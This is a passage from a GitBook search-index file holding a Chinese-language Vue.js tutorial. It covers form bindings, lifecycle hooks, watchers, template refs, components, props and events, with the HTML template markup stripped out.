数组将始终包含所有当前被选中的框的值。 单选按钮 Picked: {{ picked }} One Two 选择器 单个选择器的示例如下： Selected: {{ selected }} Please select one A B C [!TIP] 如果 v-model 表达式的初始值不匹配任何一个选择项， 元素会渲染成一个“未选择”的状态。在 iOS 上，这将导致用户无法选择第一项，因为 iOS 在这种情况下不会触发一个 change 事件。因此，我们建议提供一个空值的禁用选项，如上面的例子所示。 多选 (值绑定到一个数组)： Selected: {{ selected }} A B C 选择器的选项可以使用 v-for 动态渲染： export default { data() { return { selected: 'A', options: [ { text: 'One', value: 'A' }, { text: 'Two', value: 'B' }, { text: 'Three', value: 'C' } ] } } } {{ option.text }} Selected: {{ selected }} 值绑定 对于单选按钮，复选框和选择器选项，v-model 绑定的值通常是静态的字符串 (或者对复选框是布尔值)： ABC 但有时我们可能希望将该值绑定到当前组件实例上的动态数据。这可以通过使用 v-bind 来实现。此外，使用 v-bind 还使我们可以将选项值绑定为非字符串的数据类型。 复选框 true-value 和 false-value 是 Vue 特有的 attributes，仅支持和 v-model 配套使用。这里 toggle 属性的值会在选中时被设为 'yes'，取消选择时设为 'no'。你同样可以通过 v-bind 将其绑定为其他动态值： [!TIP] true-value 和 false-value attributes 不会影响 value attribute，因为浏览器在表单提交时，并不会包含未选择的复选框。为了保证这两个值 (例如：“yes”和“no”) 的其中之一被表单提交，请使用单选按钮作为替代。 单选按钮 pick 会在第一个按钮选中时被设为 first，在第二个按钮选中时被设为 second。 选择器选项 123 v-model 同样也支持非字符串类型的值绑定！在上面这个例子中，当某个选项被选中，selected 会被设为该对象字面量值 { number: 123 }。 修饰符 .lazy 默认情况下，v-model 会在每次 input 事件后更新数据 (IME 拼字阶段的状态例外)。你可以添加 lazy 修饰符来改为在每次 change 事件后更新数据： .number 如果你想让用户输入自动转换为数字，你可以在 v-model 后添加 .number 修饰符来管理输入： 如果该值无法被 parseFloat() 处理，那么将返回原始值。 number 修饰符会在输入框有 type=\"number\" 时自动启用。 .trim 如果你想要默认自动去除用户输入内容中两端的空格，你可以在 v-model 后添加 .trim 修饰符 组件上的 v-model 如果你还不熟悉 Vue 的组件，那么现在可以跳过这个部分。 HTML 的内置表单输入类型并不总能满足所有需求。幸运的是，我们可以使用 Vue 构建具有自定义行为的可复用输入组件，并且这些输入组件也支持 v-model！要了解更多关于此的内容，请在组件指引中阅读配合 v-model 使用。 Copyright © aaron 2023 all right reserved，powered by Gitbook该文章修订时间： 2023-06-10 15:40:23 "},"知识库/04.编程开发/03.Web前端/01.Vue.js/10.生命周期.html":{"url":"知识库/04.编程开发/03.Web前端/01.Vue.js/10.生命周期.html","title":"10.生命周期","keywords":"","body":"生命周期钩子 每个 Vue 组件实例在创建时都需要经历一系列的初始化步骤，比如设置好数据侦听，编译模板，挂载实例到 DOM，以及在数据改变时更新 DOM。在此过程中，它也会运行被称为生命周期钩子的函数，让开发者有机会在特定阶段运行自己的代码。 注册周期钩子 举例来说，mounted 钩子可以用来在组件完成初始渲染并创建 DOM 节点后运行代码： export default { mounted() { console.log(`the component is now mounted.`) } } 还有其他一些钩子，会在实例生命周期的不同阶段被调用，最常用的是 mounted、updated 和 unmounted。 所有生命周期钩子函数的 this 上下文都会自动指向当前调用它的组件实例。注意：避免用箭头函数来定义生命周期钩子，因为如果这样的话你将无法在函数中通过 this 获取组件实例。 生命周期图示 下面是实例生命周期的图表。你现在并不需要完全理解图中的所有内容，但以后它将是一个有用的参考。 Copyright © aaron 2023 all right reserved，powered by Gitbook该文章修订时间： 2023-06-10 15:41:59 "},"知识库/04.编程开发/03.Web前端/01.Vue.js/11.侦听器.html":{"url":"知识库/04.编程开发/03.Web前端/01.Vue.js/11.侦听器.html","title":"11.侦听器","keywords":"","body":"侦听器 基本示例 计算属性允许我们声明性地计算衍生值。然而在有些情况下，我们需要在状态变化时执行一些“副作用”：例如更改 DOM，或是根据异步操作的结果去修改另一处的状态。 在选项式 API 中，我们可以使用 watch 选项在每次响应式属性发生变化时触发一个函数。 export default { data() { return { question: '', answer: 'Questions usually contain a question mark. ;-)' } }, watch: { // 每当 question 改变时，这个函数就会执行 question(newQuestion, oldQuestion) { if (newQuestion.includes('?')) { this.getAnswer() } } }, methods: { async getAnswer() { this.answer = 'Thinking...' try { const res = await fetch('https://yesno.wtf/api') this.answer = (await res.json()).answer } catch (error) { this.answer = 'Error! Could not reach the API. ' + error } } } } Ask a yes/no question: {{ answer }} watch 选项也支持把键设置成用 . 分隔的路径 export default { watch: { // 注意：只能是简单的路径，不支持表达式。 'some.nested.key'(newValue) { // ... } } } 深层侦听器 watch 默认是浅层的：被侦听的属性，仅在被赋新值时，才会触发回调函数——而嵌套属性的变化不会触发。如果想侦听所有嵌套的变更，你需要深层侦听器： export default { watch: { someObject: { handler(newValue, oldValue) { // 注意：在嵌套的变更中， // 只要没有替换对象本身， // 那么这里的 `newValue` 和 `oldValue` 相同 }, deep: true } } } [!WARNING] 谨慎使用 深度侦听需要遍历被侦听对象中的所有嵌套的属性，当用于大型数据结构时，开销很大。因此请只在必要时才使用它，并且要留意性能。 即时回调的侦听器 watch 默认是懒执行的：仅当数据源变化时，才会执行回调。但在某些场景中，我们希望在创建侦听器时，立即执行一遍回调。举例来说，我们想请求一些初始数据，然后在相关状态更改时重新请求数据。 我们可以用一个对象来声明侦听器，这个对象有 handler 方法和 immediate: true 选项，这样便能强制回调函数立即执行： export default { // ... watch: { question: { handler(newQuestion) { // 在组件实例创建时会立即调用 }, // 强制立即执行回调 immediate: true } } // ... } 回调函数的初次执行就发生在 created 钩子之前。Vue 此时已经处理了 data、computed 和 methods 选项，所以这些属性在第一次调用时就是可用的。 回调的触发时机 当你更改了响应式状态，它可能会同时触发 Vue 组件更新和侦听器回调。 默认情况下，用户创建的侦听器回调，都会在 Vue 组件更新之前被调用。这意味着你在侦听器回调中访问的 DOM 将是被 Vue 更新之前的状态。 如果想在侦听器回调中能访问被 Vue 更新之后的 DOM，你需要指明 flush: 'post' 选项： export default { // ... watch: { key: { handler() {}, flush: 'post' } } } this.$watch() 我们也可以使用组件实例的 $watch() 方法来命令式地创建一个侦听器： export default { created() { this.$watch('question', (newQuestion) => { // ... }) } } 如果要在特定条件下设置一个侦听器，或者只侦听响应用户交互的内容，这方法很有用。它还允许你提前停止该侦听器。 停止侦听器 用 watch 选项或者 $watch() 实例方法声明的侦听器，会在宿主组件卸载时自动停止。因此，在大多数场景下，你无需关心怎么停止它。 在少数情况下，你的确需要在组件卸载之前就停止一个侦听器，这时可以调用 $watch() API 返回的函数： const unwatch = this.$watch('foo', callback) // ...当该侦听器不再需要时 unwatch() Copyright © aaron 2023 all right reserved，powered by Gitbook该文章修订时间： 2023-06-10 16:53:17 "},"知识库/04.编程开发/03.Web前端/01.Vue.js/12.模版引用.html":{"url":"知识库/04.编程开发/03.Web前端/01.Vue.js/12.模版引用.html","title":"12.模版引用","keywords":"","body":"模板引用 虽然 Vue 的声明性渲染模型为你抽象了大部分对 DOM 的直接操作，但在某些情况下，我们仍然需要直接访问底层 DOM 元素。要实现这一点，我们可以使用特殊的 ref attribute： ref 是一个特殊的 attribute，和 v-for 章节中提到的 key 类似。它允许我们在一个特定的 DOM 元素或子组件实例被挂载后，获得对它的直接引用。这可能很有用，比如说在组件挂载时将焦点设置到一个 input 元素上，或在一个元素上初始化一个第三方库。 访问模板引用 挂载结束后引用都会被暴露在 this.$refs 之上： export default { mounted() { this.$refs.input.focus() } } 注意，你只可以在组件挂载后才能访问模板引用。如果你想在模板中的表达式上访问 $refs.input，在初次渲染时会是 null。这是因为在初次渲染前这个元素还不存在呢！ v-for 中的模板引用 [!TIP] 需要 v3.2.25 及以上版本 当在 v-for 中使用模板引用时，相应的引用中包含的值是一个数组： export default { data() { return { list: [ /* ... */ ] } }, mounted() { console.log(this.$refs.items) } } {{ item }} 应该注意的是，ref 数组并不保证与源数组相同的顺序。 函数模板引用 除了使用字符串值作名字，ref attribute 还可以绑定为一个函数，会在每次组件更新时都被调用。该函数会收到元素引用作为其第一个参数： { /* 将 el 赋值给一个数据属性或 ref 变量 */ }\"> 注意我们这里需要使用动态的 :ref 绑定才能够传入一个函数。当绑定的元素被卸载时，函数也会被调用一次，此时的 el 参数会是 null。你当然也可以绑定一个组件方法而不是内联函数。 组件上的 ref 这一小节假设你已了解组件的相关知识，或者你也可以先跳过这里，之后再回来看。 模板引用也可以被用在一个子组件上。这种情况下引用中获得的值是组件实例： import Child from './Child.vue' export default { components: { Child }, mounted() { // this.$refs.child 是 组件的实例 } } 如果一个子组件使用的是选项式 API ，被引用的组件实例和该子组件的 this 完全一致，这意味着父组件对子组件的每一个属性和方法都有完全的访问权。这使得在父组件和子组件之间创建紧密耦合的实现细节变得很容易，当然也因此，应该只在绝对需要时才使用组件引用。大多数情况下，你应该首先使用标准的 props 和 emit 接口来实现父子组件交互 expose 选项可以用于限制对子组件实例的访问： export default { expose: ['publicData', 'publicMethod'], data() { return { publicData: 'foo', privateData: 'bar' } }, methods: { publicMethod() { /* ... */ }, privateMethod() { /* ... */ } } } 在上面这个例子中，父组件通过模板引用访问到子组件实例后，仅能访问 publicData 和 publicMethod。 Copyright © aaron 2023 all right reserved，powered by Gitbook该文章修订时间： 2023-06-10 17:00:05 "},"知识库/04.编程开发/03.Web前端/01.Vue.js/13.组件基础.html":{"url":"知识库/04.编程开发/03.Web前端/01.Vue.js/13.组件基础.html","title":"13.组件基础","keywords":"","body":"组件基础 组件允许我们将 UI 划分为独立的、可重用的部分，并且可以对每个部分进行单独的思考。在实际应用中，组件常常被组织成层层嵌套的树状结构： 这和我们嵌套 HTML 元素的方式类似，Vue 实现了自己的组件模型，使我们可以在每个组件内封装自定义内容与逻辑。Vue 同样也能很好地配合原生 Web Component。如果你想知道 Vue 组件与原生 Web Components 之间的关系，可以阅读此章节。 定义一个组件 当使用构建步骤时，我们一般会将 Vue 组件定义在一个单独的 .vue 文件中，这被叫做单文件组件 (简称 SFC)： export default { data() { return { count: 0 } } } You clicked me {{ count }} times. 当不使用构建步骤时，一个 Vue 组件以一个包含 Vue 特定选项的 JavaScript 对象来定义： export default { data() { return { count: 0 } }, template: ` You clicked me {{ count }} times. ` } 这里的模板是一个内联的 JavaScript 字符串，Vue 将会在运行时编译它。你也可以使用 ID 选择器来指向一个元素 (通常是原生的 元素)，Vue 将会使用其内容作为模板来源。 上面的例子中定义了一个组件，并在一个 .js 文件里默认导出了它自己，但你也可以通过具名导出在一个文件中导出多个组件。 使用组件 [!TIP] 我们会在接下来的指引中使用 SFC 语法，无论你是否使用构建步骤，组件相关的概念都是相同的。示例一节中展示了两种场景中的组件使用情况。 要使用一个子组件，我们需要在父组件中导入它。假设我们把计数器组件放在了一个叫做 ButtonCounter.vue 的文件中，这个组件将会以默认导出的形式被暴露给外部。 import ButtonCounter from './ButtonCounter.vue' export default { components: { ButtonCounter } } Here is a child component! 若要将导入的组件暴露给模板，我们需要在 components 选项上注册它。这个组件将会以其注册时的名字作为模板中的标签名。 当然，你也可以全局地注册一个组件，使得它在当前应用中的任何组件上都可以使用，而不需要额外再导入。关于组件的全局注册和局部注册两种方式的利弊，我们放在了组件注册这一章节中专门讨论。 组件可以被重用任意多次： Here is a child component! 你会注意到，每当点击这些按钮时，每一个组件都维护着自己的状态，是不同的 count。这是因为每当你使用一个组件，就创建了一个新的实例。 在单文件组件中，推荐为子组件使用 PascalCase 的标签名，以此来和原生的 HTML 元素作区分。虽然原生 HTML 标签名是不区分大小写的，但 Vue 单文件组件是可以在编译中区分大小写的。我们也可以使用 /> 来关闭一个标签。 如果你是直接在 DOM 中书写模板 (例如原生 元素的内容)，模板的编译需要遵从浏览器中 HTML 的解析行为。在这种情况下，你应该需要使用 kebab-case 形式并显式地关闭这些组件的标签。 传递 props 如果我们正在构建一个博客，我们可能需要一个表示博客文章的组件。我们希望所有的博客文章分享相同的视觉布局，但有不同的内容。要实现这样的效果自然必须向组件中传递数据，例如每篇文章标题和内容，这就会使用到 props。 Props 是一种特别的 attributes，你可以在组件上声明注册。要传递给博客文章组件一个标题，我们必须在组件的 props 列表上声明它。这里要用到 props 选项： export default { props: ['title'] } {{ title }} 当一个值被传递给 prop 时，它将成为该组件实例上的一个属性。该属性的值可以像其他组件属性一样，在模板和组件的 this 上下文中访问。 一个组件可以有任意多的 props，默认情况下，所有 prop 都接受任意类型的值。 当一个 prop 被注册后，可以像这样以自定义 attribute 的形式传递数据给它： 在实际应用中，我们可能在父组件中会有如下的一个博客文章数组： export default { // ... data() { return { posts: [ { id: 1, title: 'My journey with Vue' }, { id: 2, title: 'Blogging with Vue' }, { id: 3, title: 'Why Vue is so fun' } ] } } } 留意我们是如何使用 v-bind 来传递动态 prop 值的。当事先不知道要渲染的确切内容时，这一点特别有用。 以上就是目前你需要了解的关于 props 的全部了。如果你看完本章节后还想知道更多细节，我们推荐你深入阅读关于 props 的完整指引。 监听事件 让我们继续关注我们的 组件。我们会发现有时候它需要与父组件进行交互。例如，要在此处实现 A11y 的需求，将博客文章的文字能够放大，而页面的其余部分仍使用默认字号。 在父组件中，我们可以添加一个 postFontSize 数据属性来实现这个效果： data() { return { posts: [ /* ... */ ], postFontSize: 1 } } 在模板中用它来控制所有博客文章的字体大小： 然后，给 组件添加一个按钮： --> {{ title }} Enlarge text 这个按钮目前还没有做任何事情，我们想要点击这个按钮来告诉父组件它应该放大所有博客文章的文字。要解决这个问题，组件实例提供了一个自定义事件系统。父组件可以通过 v-on 或 @ 来选择性地监听子组件上抛的事件，就像监听原生 DOM 事件那样： 子组件可以通过调用内置的 $emit 方法，通过传入事件名称来抛出一个事件： --> {{ title }} Enlarge text 因为有了 @enlarge-text=\"postFontSize += 0.1\" 的监听，父组件会接收这一事件，从而更新 postFontSize 的值。 我们可以通过 emits 选项来声明需要抛出的事件： export default { props: ['title'], emits: ['enlarge-text'] } 这声明了一个组件可能触发的所有事件，还可以对事件的参数进行验证。同时，这还可以让 Vue 避免将它们作为原生事件监听器隐式地应用于子组件的根元素。 以上就是目前你需要了解的关于组件自定义事件的所有知识了。如果你看完本章节后还想知道更多细节，请深入阅读组件事件章节。 通过插槽来分配内容 一些情况下我们会希望能和 HTML 元素一样向组件中传递内容： Something bad happened. 我们期望能渲染成这样： [!NOTE] This is an Error for Demo Purposes Something bad happened. 这可以通过 Vue 的自定义 元素来实现： This is an Error for Demo Purposes .alert-box { /* ... */ } 如上所示，我们使用 作为一个占位符，父组件传递进来的内容就会渲染在这里。 动态组件 有些场景会需要在两个组件间来回切换，比如 Tab 界面 import Home from './Home.vue' import Posts from './Posts.vue' import Archive from './Archive.vue' export default { components: { Home, Posts, Archive }, data() { return { currentTab: 'Home', tabs: ['Home', 'Posts', 'Archive'] } } } {{ tab }} .demo { font-family: sans-serif; border: 1px solid #eee; border-radius: 2px; padding: 20px 30px; margin-top: 1em; margin-bottom: 40px; user-select: none; overflow-x: auto; } .tab-button { padding: 6px 10px; border-top-left-radius: 3px; border-top-right-radius: 3px; border: 1px solid #ccc; cursor: pointer; background: #f0f0f0; margin-bottom: -1px; margin-right: -1px; } .tab-button:hover { background: #e0e0e0; } .tab-button.active { background: #e0e0e0; } .tab { border: 1px solid #ccc; padding: 10px; } Home component Posts component Archive component 上面的例子是通过 Vue 的 元素和特殊的 is attribute 实现的： 在上面的例子中，被传给 :is 的值可以是以下几种： 被注册的组件名 导入的组件对象 你也可以使用 is attribute 来创建一般的 HTML 元素。 当使用 来在多个组件间作切换时，被切换掉的组件会被卸载。我们可以通过 组件强制被切换掉的组件仍然保持“存活”的状态。 DOM 模板解析注意事项 如果你想在 DOM 中直接书写 Vue 模板，Vue 则必须从 DOM 中获取模板字符串。由于浏览器的原生 HTML 解析行为限制，有一些需要注意的事项。 [!TIP] 请注意下面讨论只适用于直接在 DOM 中编写模板的情况。如果你使用来自以下来源的字符串模板，就不需要顾虑这些限制了： 单文件组件 内联模板字符串 (例如 template: '...') 大小写区分 HTML 标签和属性名称是不分大小写的，所以浏览器会把任何大写的字符解释为小写。这意味着当你使用 DOM 内的模板时，无论是 PascalCase 形式的组件名称、camelCase 形式的 prop 名称还是 v-on 的事件名称，都需要转换为相应等价的 kebab-case (短横线连字符) 形式： // JavaScript 中的 camelCase const BlogPost = { props: ['postTitle'], emits: ['updatePost'], template: ` {{ postTitle }} ` } 闭合标签 我们在上面的例子中已经使用过了闭合标签 (self-closing tag)： 这是因为 Vue 的模板解析器支持任意标签使用 /> 作为标签关闭的标志。 然而在 DOM 模板中，我们必须显式地写出关闭标签： 这是由于 HTML 只允许一小部分特殊的元素省略其关闭标签，最常见的就是 和 。对于其他的元素来说，如果你省略了关闭标签，原生的 HTML 解析器会认为开启的标签永远没有结束，用下面这个代码片段举例来说： hello 将被解析为： hello 元素位置限制 某些 HTML 元素对于放在其中的元素类型有限制，例如 ，， 和 ，相应的，某些元素仅在放置于特定元素中时才会显示，例如 ， 和 。 这将导致在使用带有此类限制元素的组件时出现问题。例如： 自定义的组件 将作为无效的内容被忽略，因而在最终呈现的输出中造成错误。我们可以使用特殊的 is attribute 作为一种解决方案： [!TIP] 当使用在原生 HTML 元素上时，is 的值必须加上前缀 vue: 才可以被解析为一个 Vue 组件。这一点是必要的，为了避免和原生的自定义内置元素相混淆。 以上就是你需要了解的关于 DOM 模板解析的所有注意事项，同时也是 Vue 基础部分的所有内容。祝贺你！虽然还有很多需要学习的，但你可以先暂停一下，去用 Vue 做一些有趣的东西，或者研究一些示例。 完成了本页的阅读后，回顾一下你刚才所学到的知识，如果还想知道更多细节，我们推荐你继续阅读关于组件的完整指引。 Copyright © aaron 2023 all right reserved，powered by Gitbook该文章修订时间： 2023-06-12 17:16:58 "},"知识库/04.编程开发/03.Web前端/01.Vue.js/14.组件注册.html":{"url":"知识库/04.编程开发/03.Web前端/01.Vue.js/14.组件注册.html","title":"14.组件注册","keywords":"","body":"组件注册 一个 Vue 组件在使用前需要先被“注册”，这样 Vue 才能在渲染模板时找到其对应的实现。组件注册有两种方式：全局注册和局部注册。 全局注册 我们可以使用 Vue 应用实例的 app.component() 方法，让组件在当前 Vue 应用中全局可用。 import { createApp } from 'vue' const app = createApp({}) app.component( // 注册的名字 'MyComponent', // 组件的实现 { /* ... */ } ) 如果使用单文件组件，你可以注册被导入的 .vue 文件： import MyComponent from './App.vue' app.component('MyComponent', MyComponent) app.component() 方法可以被链式调用： app .component('ComponentA', ComponentA) .component('ComponentB', ComponentB) .component('ComponentC', ComponentC) 全局注册的组件可以在此应用的任意组件的模板中使用： 所有的子组件也可以使用全局注册的组件，这意味着这三个组件也都可以在彼此内部使用。 局部注册 全局注册虽然很方便，但有以下几个问题： 全局注册虽然很方便，但有以下几个问题： 全局注册，但并没有被使用的组件无法在生产打包时被自动移除 (也叫“tree-shaking”)。如果你全局注册了一个组件，即使它并没有被实际使用，它仍然会出现在打包后的 JS 文件中。 全局注册在大型项目中使项目的依赖关系变得不那么明确。在父组件中使用子组件时，不太容易定位子组件的实现。和使用过多的全局变量一样，这可能会影响应用长期的可维护性。 相比之下，局部注册的组件需要在使用它的父组件中显式导入，并且只能在该父组件中使用。它的优点是使组件之间的依赖关系更加明确，并且对 tree-shaking 更加友好。 局部注册需要使用 components 选项： import ComponentA from './ComponentA.vue' export default { components: { ComponentA } } 对于每个 components 对象里的属性，它们的 key 名就是注册的组件名，而值就是相应组件的实现。上面的例子中使用的是 ES2015 的缩写语法，等价于： export default { components: { ComponentA: ComponentA } // ... } 请注意：局部注册的组件在后代组件中并*不*可用。在这个例子中，ComponentA 注册后仅在当前组件可用，而在任何的子组件或更深层的子组件中都不可用。 组件名格式 在整个指引中，我们都使用 PascalCase 作为组件名的注册格式，这是因为： PascalCase 是合法的 JavaScript 标识符。这使得在 JavaScript 中导入和注册组件都很容易，同时 IDE 也能提供较好的自动补全。 在模板中更明显地表明了这是一个 Vue 组件，而不是原生 HTML 元素。同时也能够将 Vue 组件和自定义元素 (web components) 区分开来。 在单文件组件和内联字符串模板中，我们都推荐这样做。但是，PascalCase 的标签名在 DOM 模板中是不可用的，详情参见 DOM 模板解析注意事项。 为了方便，Vue 支持将模板中使用 kebab-case 的标签解析为使用 PascalCase 注册的组件。这意味着一个以 MyComponent 为名注册的组件，在模板中可以通过 或 引用。这让我们能够使用同样的 JavaScript 组件注册代码来配合不同来源的模板。 Copyright © aaron 2023 all right reserved，powered by Gitbook该文章修订时间： 2023-06-12 14:41:19 "},"知识库/04.编程开发/03.Web前端/01.Vue.js/15.组件Props.html":{"url":"知识库/04.编程开发/03.Web前端/01.Vue.js/15.组件Props.html","title":"15.组件Props","keywords":"","body":"组件Props Props 声明 一个组件需要显式声明它所接受的 props，这样 Vue 才能知道外部传入的哪些是 props，哪些是透传 attribute (关于透传 attribute，我们会在专门的章节中讨论)。 props 需要使用 props 选项来定义： export default { props: ['foo'], created() { // props 会暴露到 `this` 上 console.log(this.foo) } } 除了使用字符串数组来声明 prop 外，还可以使用对象的形式： export default { props: { title: String, likes: Number } } 对于以对象形式声明中的每个属性，key 是 prop 的名称，而值则是该 prop 预期类型的构造函数。比如，如果要求一个 prop 的值是 number 类型，则可使用 Number 构造函数作为其声明的值。 对象形式的 props 声明不仅可以一定程度上作为组件的文档，而且如果其他开发者在使用你的组件时传递了错误的类型，也会在浏览器控制台中抛出警告。我们将在本章节稍后进一步讨论有关 prop 校验的更多细节。 TypeScript 用户请参考：为组件 Props 标注类型 传递 prop 的细节 Prop 名字格式 如果一个 prop 的名字很长，应使用 camelCase 形式，因为它们是合法的 JavaScript 标识符，可以直接在模板的表达式中使用，也可以避免在作为属性 key 名时必须加上引号。 export default { props: { greetingMessage: String } } {{ greetingMessage }} 虽然理论上你也可以在向子组件传递 props 时使用 camelCase 形式 (使用 DOM 模板时例外)，但实际上为了和 HTML attribute 对齐，我们通常会将其写为 kebab-case 形式： 对于组件名我们推荐使用 PascalCase，因为这提高了模板的可读性，能帮助我们区分 Vue 组件和原生 HTML 元素。然而对于传递 props 来说，使用 camelCase 并没有太多优势，因此我们推荐更贴近 HTML 的书写风格。 静态 vs. 动态 Pro 至此，你已经见过了很多像这样的静态值形式的 props： 相应地，还有使用 v-bind 或缩写 : 来进行动态绑定的 props： 传递不同的值类型 在上述的两个例子中，我们只传入了字符串值，但实际上任何类型的值都可以作为 props 的值被传递。 Number Boolean Array Object 使用一个对象绑定多个 prop 如果你想要将一个对象的所有属性都当作 props 传入，你可以使用没有参数的 v-bind，即只使用 v-bind 而非 :prop-name。例如，这里有一个 post 对象： export default { data() { return { post: { id: 1, title: 'My Journey with Vue' } } } } 以及下面的模板： 而这实际上等价于： 单向数据流 所有的 props 都遵循着单向绑定原则，props 因父组件的更新而变化，自然地将新的状态向下流往子组件，而不会逆向传递。这避免了子组件意外修改父组件的状态的情况，不然应用的数据流将很容易变得混乱而难以理解。 另外，每次父组件更新后，所有的子组件中的 props 都会被更新到最新值，这意味着你不应该在子组件中去更改一个 prop。若你这么做了，Vue 会在控制台上向你抛出警告： export default { props: ['foo'], created() { // ❌ 警告！prop 是只读的！ this.foo = 'bar' } } 导致你想要更改一个 prop 的需求通常来源于以下两种场景： prop 被用于传入初始值；而子组件想在之后将其作为一个局部数据属性。在这种情况下，最好是新定义一个局部数据属性，从 props 上获取初始值即可： export default { props: ['initialCounter'], data() { return { // 计数器只是将 this.initialCounter 作为初始值 // 像下面这样做就使 prop 和后续更新无关了 counter: this.initialCounter } } } 需要对传入的 prop 值做进一步的转换。在这种情况中，最好是基于该 prop 值定义一个计算属性： export default { props: ['size'], computed: { // 该 prop 变更时计算属性也会自动更新 normalizedSize() { return this.size.trim().toLowerCase() } } } 更改对象 / 数组类型的 props 当对象或数组作为 props 被传入时，虽然子组件无法更改 props 绑定，但仍然可以更改对象或数组内部的值。这是因为 JavaScript 的对象和数组是按引用传递，而对 Vue 来说，禁止这样的改动，虽然可能生效，但有很大的性能损耗，比较得不偿失。 这种更改的主要缺陷是它允许了子组件以某种不明显的方式影响父组件的状态，可能会使数据流在将来变得更难以理解。在最佳实践中，你应该尽可能避免这样的更改，除非父子组件在设计上本来就需要紧密耦合。在大多数场景下，子组件应该抛出一个事件来通知父组件做出改变。 Prop 校验 Vue 组件可以更细致地声明对传入的 props 的校验要求。比如我们上面已经看到过的类型声明，如果传入的值不满足类型要求，Vue 会在浏览器控制台中抛出警告来提醒使用者。这在开发给其他开发者使用的组件时非常有用。 要声明对 props 的校验，你可以向 props 选项提供一个带有 props 校验选项的对象，例如： export default { props: { // 基础类型检查 //（给出 `null` 和 `undefined` 值则会跳过任何类型检查） propA: Number, // 多种可能的类型 propB: [String, Number], // 必传，且为 String 类型 propC: { type: String, required: true }, // Number 类型的默认值 propD: { type: Number, default: 100 }, // 对象类型的默认值 propE: { type: Object, // 对象或者数组应当用工厂函数返回。 // 工厂函数会收到组件所接收的原始 props // 作为参数 default(rawProps) { return { message: 'hello' } } }, // 自定义类型校验函数 propF: { validator(value) { // The value must match one of these strings return ['success', 'warning', 'danger'].includes(value) } }, // 函数类型的默认值 propG: { type: Function, // 不像对象或数组的默认，这不是一个 // 工厂函数。这会是一个用来作为默认值的函数 default() { return 'Default function' } } } } 一些补充细节： 所有 prop 默认都是可选的，除非声明了 required: true。 除 Boolean 外的未传递的可选 prop 将会有一个默认值 undefined。 Boolean 类型的未传递 prop 将被转换为 false。这可以通过为它设置 default 来更改——例如：设置为 default: undefined 将与非布尔类型的 prop 的行为保持一致。 如果声明了 default 值，那么在 prop 的值被解析为 undefined 时，无论 prop 是未被传递还是显式指明的 undefined，都会改为 default 值。 当 prop 的校验失败后，Vue 会抛出一个控制台警告 (在开发模式下)。 [!TIP] 注意 prop 的校验是在组件实例被创建之前，所以实例的属性 (比如 data、computed 等) 将在 default 或 validator 函数中不可用。 运行时类型检查 校验选项中的 type 可以是下列这些原生构造函数： String Number Boolean Array Object Date Function Symbol 另外，type 也可以是自定义的类或构造函数，Vue 将会通过 instanceof 来检查类型是否匹配。例如下面这个类： class Person { constructor(firstName, lastName) { this.firstName = firstName this.lastName = lastName } } 你可以将其作为一个 prop 的类型： export default { props: { author: Person } } Vue 会通过 instanceof Person 来校验 author prop 的值是否是 Person 类的一个实例。 Boolean 类型转换 为了更贴近原生 boolean attributes 的行为，声明为 Boolean 类型的 props 有特别的类型转换规则。以带有如下声明的 组件为例： export default { props: { disabled: Boolean } } 该组件可以被这样使用： 当一个 prop 被声明为允许多种类型时，例如： export default { props: { disabled: [Boolean, Number] } } 无论声明类型的顺序如何，Boolean 类型的特殊转换规则都会被应用。 Copyright © aaron 2023 all right reserved，powered by Gitbook该文章修订时间： 2023-06-12 14:52:42 "},"知识库/04.编程开发/03.Web前端/01.Vue.js/16.组件事件.html":{"url":"知识库/04.编程开发/03.Web前端/01.Vue.js/16.组件事件.html","title":"16.组件事件","keywords":"","body":"组件事件 触发与监听事件 在组件的模板表达式中，可以直接使用 $emit 方法触发自定义事件 (例如：在 v-on 的处理函数中)： click me $emit() 方法在组件实例上也同样以 this.$emit() 的形式可用： export default { methods: { submit() { this.$emit('someEvent') } } } 父组件可以通过 v-on (缩写为 @) 来监听事件： 同样，组件的事件监听器也支持 .once 修饰符： 像组件与 prop 一样，事件的名字也提供了自动的格式转换。注意这里我们触发了一个以 camelCase 形式命名的事件，但在父组件中可以使用 kebab-case 形式来监听。与 prop 大小写格式一样，在模板中我们也推荐使用 kebab-case 形式来编写监听器。 [!TIP] 和原生 DOM 事件不一样，组件触发的事件没有冒泡机制。你只能监听直接子组件触发的事件。平级组件或是跨越多层嵌套的组件间通信，应使用一个外部的事件总线，或是使用一个全局状态管理方案。 事件参数 有时候我们会需要在触发事件时附带一个特定的值。举例来说，我们想要 组件来管理文本会缩放得多大。在这个场景下，我们可以给 $emit 提供一个额外的参数： Increase by 1 然后我们在父组件中监听事件，我们可以先简单写一个内联的箭头函数作为监听器，此函数会接收到事件附带的参数： count += n\" /> 或者，也可以用一个组件方法来作为事件处理函数： 该方法也会接收到事件所传递的参数： methods: { increaseCount(n) { this.count += n } } [!TIP] 所有传入 $emit() 的额外参数都会被直接传向监听器。举例来说，$emit('foo', 1, 2, 3) 触发后，监听器函数将会收到这三个参数值。 声明触发的事件 组件可以显式地通过 emits 选项来声明它要触发的事件： export default { emits: ['inFocus', 'submit'] } 这个 emits 选项还支持对象语法，它允许我们对触发事件的参数进行验证： export default { emits: { submit(payload) { // 通过返回值为 `true` 还是为 `false` 来判断 // 验证是否通过 } } } TypeScript 用户请参考：如何为组件所抛出的事件标注类型。 尽管事件声明是可选的，我们还是推荐你完整地声明所有要触发的事件，以此在代码中作为文档记录组件的用法。同时，事件声明能让 Vue 更好地将事件和透传 attribute 作出区分，从而避免一些由第三方代码触发的自定义 DOM 事件所导致的边界情况。 [!TIP] 如果一个原生事件的名字 (例如 click) 被定义在 emits 选项中，则监听器只会监听组件触发的 click 事件而不会再响应原生的 click 事件。 事件校验 和对 props 添加类型校验的方式类似，所有触发的事件也可以使用对象形式来描述。 要为事件添加校验，那么事件可以被赋值为一个函数，接受的参数就是抛出事件时传入 this.$emit 的内容，返回一个布尔值来表明事件是否合法。 export default { emits: { // 没有校验 click: null, // 校验 submit 事件 submit: ({ email, password }) => { if (email && password) { return true } else { console.warn('Invalid submit event payload!') return false } } }, methods: { submitForm(email, password) { this.$emit('submit', { email, password }) } } } Copyright © aaron 2023 all right reserved，powered by Gitbook该文章修订时间： 2023-06-12 14:57:38 "},"知识库/04.编程开发/03.Web前端/01.Vue.js/17.组件v-model.html":{"url":"知识库/04.编程开发/03.Web前端/01.Vue.js/17.组件v-model.html","title":"17.组件v-model","keywords":"","body":"组件 v-model v-model 可以在组件上使用以实现双向绑定。 首先让我们回忆一下 v-model 在原生元素上的用法： 在代码背后，模板编译器会对 v-model 